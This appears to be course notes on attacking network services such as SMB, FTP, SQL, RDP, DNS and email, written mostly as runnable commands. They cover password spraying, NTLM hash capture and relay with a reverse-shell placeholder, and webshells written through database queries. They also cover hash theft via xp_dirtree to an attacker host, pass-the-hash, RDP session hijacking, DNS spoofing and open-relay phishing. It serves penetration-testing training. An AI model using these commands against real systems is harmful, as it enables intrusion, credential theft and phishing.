# Attacking Common Services

## Interacting with Common Services

To attack a service, you need its purpose, interaction methods, and the right tools. Internal file shares still mean SMB, NFS, FTP, TFTP, and SFTP. Cloud services such as S3, Blob, OneDrive, and SharePoint also appear, but the interaction concepts transfer.

### SMB

Windows GUI: `WINKEY+R` → `\\<IP>\Finance\` — no authentication prompt means anonymous access or that your current user already has rights.

CMD:

```cmd
dir \\<TARGET_IP>\Finance
net use n: \\<TARGET_IP>\Finance                              :: map as n:
net use n: \\<TARGET_IP>\Finance /user:plaintext Password123  :: with credentials
dir n: /a-d /s /b | find /c ":\"                              :: count all files (29302 in the demo)
dir n:\*cred* /s /b                                           :: filename hunt — try cred, password, users, secrets, key, source extensions (.cs .go .php .asp...)
findstr /s /i cred n:\*.*                                     :: content hunt
```

PowerShell equivalents run both cmdlets and Windows commands; CMD only runs the latter:

```powershell
Get-ChildItem \\<TARGET_IP>\Finance\

# credentialed mapping via PSCredential object
$username = 'plaintext'; $password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\<TARGET_IP>\Finance" -PSProvider "FileSystem" -Credential $cred

(Get-ChildItem -File -Recurse | Measure-Object).Count        :: same count as dir trick
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List   :: grep equivalent
```

Linux — mount it and use native tools:

```bash
sudo apt install cifs-utils
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=<USERNAME>,password=<PASSWORD>,domain=. //<TARGET_IP>/Finance /mnt/Finance
# or: mount -t cifs //<TARGET_IP>/Finance /mnt/Finance -o credentials=/path/credentialfile
#   (file: username=... / password=... / domain=.)

find /mnt/Finance/ -name *cred*
grep -rn /mnt/Finance/ -ie cred
```

### Email

Sending uses SMTP; receiving uses POP3 or IMAP. A GUI client such as Evolution handles both:

```bash
sudo apt-get install evolution
```

If bwrap errors:

```bash
export WEBKIT_FORCE_SANDBOX=0 && evolution
```

Use the domain or IP. Pick TLS-on-dedicated-port or STARTTLS to match the server; “Check for Supported Types” confirms.

### Databases

Three ways in: CLI utilities (`mysql`, `sqsh`, `sqlcmd`), programming languages, and GUIs such as HeidiSQL, MySQL Workbench, SSMS (Windows only), or the multi-engine cross-platform option dbeaver.

```bash
sudo dpkg -i dbeaver-<version>.deb
dbeaver &
```

### Tools

| Service   | Tools                                                                   |
| --------- | ----------------------------------------------------------------------- |
| SMB       | `smbclient`, CrackMapExec, SMBMap, Impacket (`psexec.py`, `smbexec.py`) |
| FTP       | `ftp`, `lftp`, `ncftp`, filezilla, crossftp                             |
| Email     | Thunderbird, Claws, Geary, mutt, swaks, sendEmail                       |
| Databases | `mssql-cli`, `mycli`, `mssqlclient.py`, dbeaver                         |

When access fails, work the checklist: authentication, privileges, network connection, firewall rules, and protocol support. Then chase the specific error code in documentation or forums.

## The Concept of Attacks

A four-category pattern maps onto every vulnerability:

* **Source** — where the input comes from: code, libraries, configuration, APIs, and user input. Exploitation happens here.
* **Processes** — how the input gets handled: PID, input, data processing, variables, and logging. Most bugs live here.
* **Privileges** — what the process is allowed to do: system (`SYSTEM`/root), user, groups, policies, and rules.
* **Destination** — where results go: local files, records, local services, or remote interfaces.

Log4j (CVE-2021-44228) through this lens, twice around the loop:

{% stepper %}
{% step %}
## Initial lookup

An attacker puts a JNDI lookup in the User-Agent header (**Source**) → the library misinterprets the string and executes it instead of logging (**Process**) → logging paths run with admin privileges (**Privileges**) → the lookup hits the attacker's server hosting a malicious Java class (**Destination**).
{% endstep %}

{% step %}
## Callback execution

That class becomes the new **Source**, its code is loaded and executed (**Process**), again with admin rights (**Privileges**), and the callback gives remote control (**Destination**).
{% endstep %}
{% endstepper %}

The template works for analyzing exploits, debugging your own, and walking source code.

## Service Misconfigurations

* **Default/weak credentials** — after grabbing the banner, check vendor defaults, then classic combinations: `admin:admin`, `admin:password`, `admin:<blank>`, `root:12345678`, `administrator:Password`.
* **Anonymous authentication** — the service accepts anyone with no prompt.
* **Misconfigured access rights** — for example, an upload-only FTP user who can read every document: configurations, plaintext credentials, and PII. RBAC and ACLs exist for this.
* **Unnecessary defaults** — settings shipped for usability rather than security (OWASP Security Misconfiguration): extra ports, services, pages, or accounts enabled; default accounts unchanged; verbose error handling; or security features disabled after upgrades.

## Finding Sensitive Information

The module's chain worth internalizing: anonymous FTP yields an empty file named `johnsmith` → try it as email credentials → it works → search the mailbox for `password` → find MSSQL credentials → database built-in command execution → RCE.

One “insignificant” detail carried the whole chain.

Sensitive information includes usernames, email addresses, passwords, DNS records, IPs, source code, configuration files, and PII.

Two requirements:

* Understand the service.
* Know what you are looking for, shaped by the target's business and purpose.

## Attacking FTP

TCP/21. Attack paths include misconfigurations, excessive privileges, and known or new vulnerabilities. Then mine the contents.

```bash
sudo nmap -sC -sV -p 21 <TARGET_IP>     # ftp-anon script checks + lists anonymous-reachable files
ftp <TARGET_IP>                          # anonymous / no password; ls, cd, get/mget, put/mput
```

Anonymous access plus sloppy read/write permissions can let you download sensitive data or upload a payload, paired with a web application path traversal for PHP execution.

### Brute Forcing

When anonymous access is unavailable:

```bash
medusa -u fiona -P rockyou.txt -h <TARGET_IP> -M ftp
```

Most applications defend against this now; spraying is usually the better bet.

### FTP Bounce Attack

Abuse the server's `PORT` command to reach or scan hosts you cannot reach directly, such as an internal-only box behind an internet-exposed FTP server.

```bash
nmap -Pn -v -n -p80 -b anonymous:password@<FTP_IP> <INTERNAL_IP>
```

Modern FTP daemons block this by default; misconfiguration reopens it.

## Attacking SMB

* `445` = SMB direct over TCP
* `139` = SMB over NetBIOS (NBT)
* Samba is the Unix implementation.
* MSRPC rides SMB named pipes and is part of the attack surface.

```bash
sudo nmap <TARGET_IP> -sV -sC -p139,445
```

On Windows targets, version information is usually absent and Nmap guesses. On Samba, you get the version directly, for example `Samba smbd 4.6.2`, enabling version-specific exploit research.

### Null Session Enumeration

```bash
smbclient -N -L //<TARGET_IP>                 # list shares
smbmap -H <TARGET_IP>                         # shares + permission per share (READ/WRITE/NO ACCESS)
smbmap -H <TARGET_IP> -r notes                # browse a share (-R recursive)
smbmap -H <TARGET_IP> --download "notes\note.txt"
smbmap -H <TARGET_IP> --upload test.txt "notes\test.txt"

rpcclient -U'%' <TARGET_IP>                   # then: enumdomusers (and much more — SANS rpcclient cheat sheet)
./enum4linux-ng.py <TARGET_IP> -A -C          # automated: users, groups, shares, OS, password policy
```

### Brute Force and Spraying

Brute forcing risks lockout. Spraying one password across a user list is safer: 2–3 attempts, 30–60 minutes apart, if the threshold is known.

```bash
crackmapexec smb <TARGET_IP> -u userlist.txt -p 'Company01!' --local-auth
# [+] WIN7BOX\jurena:Company01! (Pwn3d!)
```

CME stops at the first success unless `--continue-on-success` is used. Use `--local-auth` for non-domain-joined targets.

### Admin Rights

With admin rights on Windows, the surface expands to remote command execution, SAM hash extraction, logged-on user enumeration, and PtH.

RCE follows the PsExec pattern: upload a service binary to `ADMIN$`, start it via Service Control Manager over DCE/RPC, then communicate through a named pipe.

```bash
impacket-psexec administrator:'<PASSWORD>'@<TARGET_IP>     # same shape: smbexec, atexec (Task Scheduler)
crackmapexec smb <TARGET_IP> -u Administrator -p '<PASSWORD>' -x 'whoami' --exec-method smbexec   # -X for PowerShell; atexec is the default fallback
```

```bash
crackmapexec smb <SUBNET>/24 -u administrator -p '<PASSWORD>' --loggedon-users   # every host at once
crackmapexec smb <TARGET_IP> -u administrator -p '<PASSWORD>' --sam              # dump local hashes
crackmapexec smb <TARGET_IP> -u Administrator -H <NTHASH>                        # Pass the Hash
```

### Forced Authentication

Responder poisons LLMNR, NBT-NS, and mDNS. Windows name resolution order is:

1. Hosts file
2. DNS cache
3. DNS server
4. Multicast

A typoed share name such as `\\mysharefoder\` falls through to multicast, Responder answers, and the victim hands over a NetNTLMv2 hash.

```bash
sudo responder -I tun0
# [SMB] NTLMv2-SSP Hash : demouser::WIN7BOX:...
```

The same account produces different-looking hashes every time because client and server challenges are randomized. They all represent the same password.

```bash
hashcat -m 5600 hash.txt rockyou.txt
```

If the hash is uncrackable, relay it. Disable Responder's own SMB listener first in `/etc/responder/Responder.conf`:

```
SMB = Off
```

Then send the victim authentication to `ntlmrelayx`:

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>          # dumps SAM by default
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -e <base64 revshell>'
```

RPC, beyond enumeration, can change a user's password, create domain users, and create shares when configuration and privileges permit it.

## Attacking SQL Databases

High-value targets include credentials, PII, payment data, and often high-privileged service accounts.

| Database | Ports                                             |
| -------- | ------------------------------------------------- |
| MSSQL    | `1433` TCP / `1434` UDP (`2433` in “hidden” mode) |
| MySQL    | `3306`                                            |

```bash
nmap -Pn -sV -sC -p1433 <TARGET_IP>      # ms-sql-info + ms-sql-ntlm-info leak version, hostname, domain
```

MSSQL supports Windows authentication mode, integrated with AD by default, or Mixed mode, which also supports SQL-local accounts.

Historical note: CVE-2012-2122 allowed MySQL 5.6.x authentication bypass via timing. Repeated identical incorrect passwords could eventually “succeed.”

### Clients

```bash
mysql -u julio -p'<PASSWORD>' -h <TARGET_IP>
sqlcmd -S <TARGET_IP> -U julio -P '<PASSWORD>' -y 30 -Y 30          # Windows; -y/-Y = display widths
sqsh -S <TARGET_IP> -U julio -P '<PASSWORD>' -h                      # Linux; -h strips headers
sqsh -S <TARGET_IP> -U .\\julio -P '<PASSWORD>' -h                   # .\ or HOSTNAME\ = Windows/local auth
mssqlclient.py -p 1433 julio@<TARGET_IP>                             # Impacket
```

Default databases worth knowing:

| MySQL                | MSSQL      |
| -------------------- | ---------- |
| `mysql`              | `master`   |
| `information_schema` | `msdb`     |
| `performance_schema` | `model`    |
| `sys`                | `resource` |
|                      | `tempdb`   |

These enumerate structure; company data lives elsewhere.

### Enumeration Syntax

`sqlcmd` needs `GO` to execute.

```sql
SHOW DATABASES;                                    -- mysql
SELECT name FROM master.dbo.sysdatabases           -- mssql
USE htbusers;
SHOW TABLES;                                       -- mysql
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES   -- mssql
SELECT * FROM users;
```

### Command Execution

MSSQL's `xp_cmdshell` is disabled by default. The spawned process runs as the SQL service account.

```sql
xp_cmdshell 'whoami'
```

```sql
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Other paths include custom extended procedures, CLR assemblies, Agent jobs, external scripts, and `xp_regwrite` for registry-based privilege escalation.

MySQL User Defined Functions can run C/C++. A command-execution UDF exists but is rare in production.

### Write Files

```sql
-- MySQL: webshell into a webroot (needs FILE privilege; check secure_file_priv: empty = no limit, NULL = disabled)
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
show variables like "secure_file_priv";
```

```sql
-- MSSQL: enable Ole Automation Procedures (admin), then Scripting.FileSystemObject
sp_configure 'show advanced options', 1; RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @OLE INT; DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE;
```

### Read Files

```sql
-- MSSQL: any file the service account can read
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
-- MySQL (with FILE privilege + secure_file_priv allowing it):
select LOAD_FILE("/etc/passwd");
```

### Steal the Service Account Hash

`xp_dirtree` and `xp_subdirs` perform SMB directory listings. Point them at your listener.

```bash
sudo responder -I tun0        # or: sudo impacket-smbserver share ./ -smb2support
```

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
```

Crack or relay the resulting NetNTLMv2 hash.

### IMPERSONATE

Escalate inside MSSQL without leaving SQL:

```sql
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
-- returns sa, ben, valentin...

SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');   -- 0 = not sysadmin
USE master;                                                 -- impersonate from master; other DBs may error
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');   -- sa, 1
REVERT;
```

### Linked Servers

Linked servers allow lateral movement between SQL instances. If the link's credentials are `sysadmin` there, you own that instance.

```sql
SELECT srvname, isremote FROM sysservers;    -- isremote 1 = remote, 0 = linked
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];
-- escape single quotes by doubling; chain commands with ;
```

Then use `xp_cmdshell` on the far side.

PostgreSQL, SQLite, Oracle, Firebase, and MongoDB have their own attack profiles and are worth reading beyond this module.

## Attacking RDP

TCP/3389:

```bash
nmap -Pn -p3389 <TARGET_IP>
```

Password guessing risks lockout, so spray instead:

```bash
crowbar -b rdp -s <TARGET_IP>/32 -U users.txt -c 'password123'
hydra -L usernames.txt -p 'password123' <TARGET_IP> rdp     # mind the -t 1/-t 4 warnings
rdesktop -u admin -p '<PASSWORD>' <TARGET_IP>                # or xfreerdp
```

### RDP Session Hijacking

With local admin rights on a box where a more privileged user has an active RDP session, connect into their session with `tscon`. This requires `SYSTEM`.

```cmd
query user
::  juurena  rdp-tcp#13  1  Active
::  lewen    rdp-tcp#14  2  Active
tscon 2 /dest:rdp-tcp#13                       :: direct, if already SYSTEM

:: from local admin: service trick to get SYSTEM
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```

A console as the target user appears. This is dead on Server 2019.

### RDP PtH

GUI access with only an NT hash requires Restricted Admin Mode, which is disabled by default. Otherwise, an “Account restrictions...” error appears.

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:<TARGET_IP> /u:lewen /pth:<NTHASH>
```

It does not work everywhere, but with a hash, RDP rights, and a GUI-shaped goal, always try it.

## Attacking DNS

UDP/53 is the default; TCP/53 is the fallback for large responses. Attacks here affect nearly every application.

```bash
nmap -p53 -Pn -sV -sC <TARGET_IP>
```

### Zone Transfer

AXFR needs no authentication. Misconfigured servers hand the entire zone to anyone.

```bash
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
fierce --domain zonetransfer.me          # enumerates NS/SOA and tries the transfer
```

### Subdomain Takeover

A CNAME may point at an expired or claimable third party such as AWS, GitHub, Akamai, or Fastly.

```
sub.target.com.  60  IN  CNAME  anotherdomain.com
```

Claim `anotherdomain.com` to control `sub.target.com` until DNS is fixed.

Enumeration first:

```bash
./subfinder -d inlanefreight.com -v                          # passive scraping of public sources
# pure brute force, works internally without internet:
git clone https://github.com/TheRook/subbrute.git && cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt

host support.inlanefreight.com
# "is an alias for inlanefreight.s3.amazonaws.com" → browse it; NoSuchBucket = takeover candidate (claim the S3 bucket name)
```

The can-i-take-over-xyz repository tracks which services are actually vulnerable.

### DNS Spoofing and Cache Poisoning

MITM the resolver path or exploit the DNS server. Locally with Ettercap, map targets in `/etc/ettercap/etter.dns`:

```
inlanefreight.com      A   <ATTACKER_IP>
*.inlanefreight.com    A   <ATTACKER_IP>
```

Then:

1. Select **Hosts > Scan for Hosts**.
2. Set the victim as **Target1**.
3. Set the gateway as **Target2**.
4. Select **Plugins > dns\_spoof**.

The victim's `ping inlanefreight.com` now resolves to you.

## Attacking Email Services

Flow: client → SMTP → server → SMTP → server → IMAP/POP3 → client.

POP3 deletes messages on download by default; IMAP keeps messages server-side.

Find the mail provider through MX records:

```bash
host -t MX hackthebox.eu         # aspmx.l.google.com → G-Suite
host -t MX microsoft.com         # ...outlook.com → Microsoft 365
dig mx plaintext.do | grep "MX" | grep -v ";"
host -t A mail1.inlanefreight.htb.
```

Cloud versus self-hosted deployment determines the attack path.

Custom mail server ports:

| Service       | Port |
| ------------- | ---: |
| SMTP          |   25 |
| POP3          |  110 |
| IMAP4         |  143 |
| SMTPS         |  465 |
| SMTP STARTTLS |  587 |
| IMAPS         |  993 |
| POP3S         |  995 |

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <TARGET_IP>
```

### Username Enumeration

Enumerate over SMTP using telnet, then spray, brute force, or guess.

```
VRFY root        → 252 (exists) / 550 (unknown)
EXPN support-team → lists every member of the alias
MAIL FROM:test@htb.com → RCPT TO:john → 250 (valid recipient) / 550 (unknown)
```

POP3:

```
USER john
```

Responses:

* `+OK` — valid
* `-ERR` — invalid

Automate enumeration:

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t <TARGET_IP>
```

### Cloud: Office 365

```bash
python3 o365spray.py --validate --domain msplaintext.xyz
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

Cloud providers block Hydra-style protocol attacks. Custom tools such as o365spray, MailSniper for O365, and CredKing for Gmail/Okta target APIs and can break whenever providers change behavior, so know what your tool does.

### On-Prem Password Attacks

```bash
hydra -L users.txt -p 'Company01!' -f <TARGET_IP> pop3     # also smtp / imap
```

### Open Relay

An unauthenticated SMTP relay enables phishing as anyone, including spoofing a real internal notification address.

```bash
nmap -p25 -Pn --script smtp-open-relay <TARGET_IP>
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, ... http://mycustomphishinglink.com/' --server <TARGET_IP>
```
